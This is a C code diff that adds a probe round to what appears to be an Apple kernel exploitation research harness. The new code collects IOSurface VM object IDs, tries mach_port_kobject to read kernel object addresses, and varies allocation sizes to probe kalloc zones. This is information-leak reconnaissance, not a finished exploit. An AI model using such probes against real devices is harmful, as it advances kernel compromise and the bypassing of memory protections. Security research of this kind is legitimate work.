@@ -16976,6 +16976,279 @@ static void *r445_thread_fn(void *arg) {
     return NULL;
 }
 
+static void r446_probe(void) {
+    rlog("\n=== r446: Object ID correlation analysis + memory entry probe ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Multiple surface object_id comparison */
+    rlog("  --- Vector A: Multi-surface object_id patterns ---\n");
+    {
+        #define R446_NSURFS 20
+        IOSurfaceRef surfs[R446_NSURFS];
+        uint64_t page_obj_ids[R446_NSURFS];
+        uint64_t region_obj_ids[R446_NSURFS];
+        uint64_t backing_obj_ids[R446_NSURFS];
+        uint64_t backing_page_obj_ids[R446_NSURFS];
+
+        for (int i = 0; i < R446_NSURFS; i++) {
+            int sw = 32, sh = 32, sbr = 128, sa = 4096, spf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef sn[5];
+            sn[0] = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+            sn[1] = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+            sn[2] = CFNumberCreate(NULL, kCFNumberIntType, &sbr);
+            sn[3] = CFNumberCreate(NULL, kCFNumberIntType, &sa);
+            sn[4] = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), sn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), sn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), sn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), sn[4]);
+            surfs[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int j = 0; j < 5; j++) CFRelease(sn[j]);
+
+            page_obj_ids[i] = 0;
+            region_obj_ids[i] = 0;
+            backing_obj_ids[i] = 0;
+            backing_page_obj_ids[i] = 0;
+
+            if (surfs[i]) {
+                /* Get shared data address */
+                uint64_t *shr = (uint64_t*)*(void**)((char*)surfs[i] + 8);
+                uint64_t shr_addr = (uint64_t)shr;
+
+                /* vm_region on shared data */
+                mach_vm_address_t addr = shr_addr;
+                mach_vm_size_t size = 0;
+                natural_t depth = 0;
+                struct vm_region_submap_info_64 info;
+                mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &size,
+                    &depth, (vm_region_recurse_info_t)&info, &count);
+                if (kr == KERN_SUCCESS) {
+                    region_obj_ids[i] = info.object_id;
+                }
+
+                /* page_info on shared data */
+                r415_page_info_t pinfo;
+                mach_msg_type_number_t pcount = sizeof(pinfo)/sizeof(int);
+                kr = mach_vm_page_info(mach_task_self(), shr_addr, 1, &pinfo, &pcount);
+                if (kr == KERN_SUCCESS) {
+                    page_obj_ids[i] = pinfo.object_id;
+                }
+
+                /* Backing store */
+                IOSurfaceLock(surfs[i], 0, NULL);
+                void *base = IOSurfaceGetBaseAddress(surfs[i]);
+                if (base) {
+                    mach_vm_address_t baddr = (mach_vm_address_t)base;
+                    mach_vm_size_t bsize = 0;
+                    natural_t bdepth = 0;
+                    count = VM_REGION_SUBMAP_INFO_COUNT_64;
+                    kr = mach_vm_region_recurse(mach_task_self(), &baddr, &bsize,
+                        &bdepth, (vm_region_recurse_info_t)&info, &count);
+                    if (kr == KERN_SUCCESS) {
+                        backing_obj_ids[i] = info.object_id;
+                    }
+
+                    /* page_info on backing store */
+                    pcount = sizeof(pinfo)/sizeof(int);
+                    kr = mach_vm_page_info(mach_task_self(), (mach_vm_address_t)base, 1, &pinfo, &pcount);
+                    if (kr == KERN_SUCCESS) {
+                        backing_page_obj_ids[i] = pinfo.object_id;
+                    }
+                }
+                IOSurfaceUnlock(surfs[i], 0, NULL);
+            }
+        }
+
+        /* Analyze patterns */
+        rlog("    Surface | Region ObjID   | Page ObjID (64-bit)      | Backing ObjID  | Backing Page ObjID\n");
+        rlog("    --------|----------------|--------------------------|----------------|--------------------------\n");
+        for (int i = 0; i < R446_NSURFS; i++) {
+            rlog("    %6d  | 0x%08llx     | 0x%016llx | 0x%08llx     | 0x%016llx\n",
+                 i,
+                 (unsigned long long)(region_obj_ids[i] & 0xFFFFFFFF),
+                 (unsigned long long)page_obj_ids[i],
+                 (unsigned long long)(backing_obj_ids[i] & 0xFFFFFFFF),
+                 (unsigned long long)backing_page_obj_ids[i]);
+        }
+
+        /* Check if page_obj_ids are sequential */
+        rlog("\n    Backing page ObjID deltas:\n");
+        for (int i = 1; i < R446_NSURFS; i++) {
+            if (backing_page_obj_ids[i] && backing_page_obj_ids[i-1]) {
+                int64_t delta = (int64_t)(backing_page_obj_ids[i] - backing_page_obj_ids[i-1]);
+                rlog("      [%d]-[%d] = %lld (0x%llx)\n", i, i-1,
+                     (long long)delta, (unsigned long long)(uint64_t)delta);
+            }
+        }
+
+        /* Check upper 32-bit patterns */
+        rlog("\n    Upper 32-bit analysis (page_obj_id >> 32):\n");
+        for (int i = 0; i < R446_NSURFS; i++) {
+            uint32_t upper = (uint32_t)(backing_page_obj_ids[i] >> 32);
+            uint32_t lower = (uint32_t)(backing_page_obj_ids[i] & 0xFFFFFFFF);
+            rlog("      surf[%d]: upper=0x%08x lower=0x%08x\n", i, upper, lower);
+        }
+
+        for (int i = 0; i < R446_NSURFS; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: Memory entry from IOSurface backing store */
+    rlog("\n  --- Vector B: mach_make_memory_entry_64 on backing store ---\n");
+    {
+        IOSurfaceRef bsurf = NULL;
+        {
+            int bw = 64, bh = 64, bbr = 256, ba = 16384, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            bsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int j = 0; j < 5; j++) CFRelease(bn[j]);
+        }
+
+        if (bsurf) {
+            IOSurfaceLock(bsurf, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(bsurf);
+            if (base) {
+                /* Create a memory entry for the backing store page */
+                memory_object_size_t me_size = 16384;
+                mach_port_t me_port = MACH_PORT_NULL;
+                kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                    &me_size, (memory_object_offset_t)(uintptr_t)base,
+                    VM_PROT_READ, &me_port, MACH_PORT_NULL);
+                rlog("    mach_make_memory_entry_64 kr=%d, port=0x%x, size=%llu\n",
+                     kr, me_port, (unsigned long long)me_size);
+
+                if (kr == KERN_SUCCESS && me_port != MACH_PORT_NULL) {
+                    /* Get port info — might have kernel object address */
+                    mach_port_type_t ptype;
+                    mach_port_type(mach_task_self(), me_port, &ptype);
+                    rlog("    Port type=0x%x\n", ptype);
+
+                    /* Try kobject */
+                    natural_t kobj_type = 0;
+                    mach_vm_address_t kobj_addr = 0;
+                    kr = mach_port_kobject(mach_task_self(), me_port, &kobj_type, (mach_port_t*)&kobj_addr);
+                    rlog("    mach_port_kobject kr=%d, type=%u, addr=0x%llx\n",
+                         kr, kobj_type, (unsigned long long)kobj_addr);
+
+                    /* Map through the memory entry to a new location */
+                    mach_vm_address_t new_addr = 0;
+                    kr = mach_vm_map(mach_task_self(), &new_addr, me_size, 0,
+                        VM_FLAGS_ANYWHERE, me_port, 0, FALSE,
+                        VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
+                    rlog("    mach_vm_map kr=%d, new_addr=0x%llx\n",
+                         kr, (unsigned long long)new_addr);
+
+                    if (kr == KERN_SUCCESS) {
+                        /* Get vm_region info on the mapped entry */
+                        mach_vm_address_t raddr = new_addr;
+                        mach_vm_size_t rsize = 0;
+                        natural_t rdepth = 0;
+                        struct vm_region_submap_info_64 rinfo;
+                        mach_msg_type_number_t rcount = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        kr = mach_vm_region_recurse(mach_task_self(), &raddr, &rsize,
+                            &rdepth, (vm_region_recurse_info_t)&rinfo, &rcount);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("    Remapped region: obj_id=0x%llx share_mode=%d tag=%d\n",
+                                 (unsigned long long)rinfo.object_id, rinfo.share_mode, rinfo.user_tag);
+                        }
+
+                        /* page_info on remapped region */
+                        r415_page_info_t pinfo;
+                        mach_msg_type_number_t pcount = sizeof(pinfo)/sizeof(int);
+                        kr = mach_vm_page_info(mach_task_self(), new_addr, 1, &pinfo, &pcount);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("    Remapped page_info: obj_id=0x%016llx offset=0x%llx ref=%d\n",
+                                 (unsigned long long)pinfo.object_id,
+                                 (unsigned long long)pinfo.offset, pinfo.ref_count);
+                        }
+
+                        /* Compare data between original and remapped */
+                        int match = memcmp(base, (void*)(uintptr_t)new_addr, 128) == 0;
+                        rlog("    Data match (first 128 bytes): %d\n", match);
+
+                        mach_vm_deallocate(mach_task_self(), new_addr, me_size);
+                    }
+
+                    mach_port_deallocate(mach_task_self(), me_port);
+                }
+            }
+            IOSurfaceUnlock(bsurf, 0, NULL);
+            CFRelease(bsurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: Different-sized surfaces → different kalloc zones → object_id patterns */
+    rlog("\n  --- Vector C: Size-varying surface object_ids ---\n");
+    {
+        int sizes[] = {4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288, 1048576};
+        int nsizes = 9;
+
+        for (int si = 0; si < nsizes; si++) {
+            int sw = 32, sh = sizes[si] / 128, sbr = 128, sa = sizes[si], spf = 0x42475241;
+            if (sh < 1) sh = 1;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef sn[5];
+            sn[0] = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+            sn[1] = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+            sn[2] = CFNumberCreate(NULL, kCFNumberIntType, &sbr);
+            sn[3] = CFNumberCreate(NULL, kCFNumberIntType, &sa);
+            sn[4] = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), sn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), sn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), sn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), sn[4]);
+            IOSurfaceRef s = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int j = 0; j < 5; j++) CFRelease(sn[j]);
+
+            if (s) {
+                IOSurfaceLock(s, 0, NULL);
+                void *base = IOSurfaceGetBaseAddress(s);
+                if (base) {
+                    r415_page_info_t pinfo;
+                    mach_msg_type_number_t pcount = sizeof(pinfo)/sizeof(int);
+                    kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                        (mach_vm_address_t)base, 1, &pinfo, &pcount);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    size=%7d: page_obj_id=0x%016llx offset=0x%llx ref=%d disp=%d\n",
+                             sizes[si], (unsigned long long)pinfo.object_id,
+                             (unsigned long long)pinfo.offset, pinfo.ref_count, pinfo.disposition);
+                    }
+                }
+                IOSurfaceUnlock(s, 0, NULL);
+                CFRelease(s);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r446 complete ===\n");
+    fflush(stdout);
+}
+
 static void r445_probe(void) {
     rlog("\n=== r445: Pipe reclaim + thread state snoop + mach trailers ===\n\n");
     fflush(stdout);
@@ -79232,6 +79505,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 449) {
+            rlog("*** rounds=449: Object ID correlation + memory entry probe ***\n\n");
+            fflush(stdout);
+            r446_probe();
+            goto done;
+        }
         if (rounds == 448) {
             rlog("*** rounds=448: Pipe reclaim + thread state snoop + mach trailers ***\n\n");
             fflush(stdout);
@@ -81946,7 +82225,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
